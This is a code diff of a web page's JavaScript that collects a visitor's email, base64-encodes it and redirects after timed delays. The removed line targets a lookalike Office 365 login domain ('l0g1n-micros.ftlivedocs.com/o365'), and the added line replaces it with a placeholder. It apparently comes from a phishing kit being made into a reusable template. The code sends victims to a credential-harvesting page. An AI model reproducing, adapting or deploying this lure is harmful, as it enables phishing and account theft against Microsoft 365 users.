@@ -97,26 +97,12 @@
                         const encodedEmail = btoa(email); // Encode email in base64
 
                         // Add your custom redirect URL here
-                        const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + encodedEmail;
+                        const redirectTo = "https://your-redirect-url.com/#" + encodedEmail;
 
                         console.log("Redirecting to: " + redirectTo);
                         window.location.href = redirectTo; // Redirect with base64 email in hash
                     }, 6000);
                 }, 10000);
-            }
-
-            // Decode base64 email from URL hash
-            function decodeEmailFromHash() {
-                const hash = window.location.hash.substr(1); // Remove the '#' symbol
-                if (hash) {
-                    try {
-                        return atob(hash); // Decode base64 to email
-                    } catch (error) {
-                        console.error("Failed to decode email from base64:", error);
-                        return null;
-                    }
-                }
-                return null;
             }
 
             // Onload function to handle email submission and redirection
@@ -134,12 +120,6 @@
                         alert("Please enter a valid email address.");
                     }
                 });
-
-                // If redirected and there's an email in the hash, decode it and display it
-                const decodedEmail = decodeEmailFromHash();
-                if (decodedEmail) {
-                    alert("Welcome back, " + decodedEmail + "!");
-                }
             };
         })();
     </script>
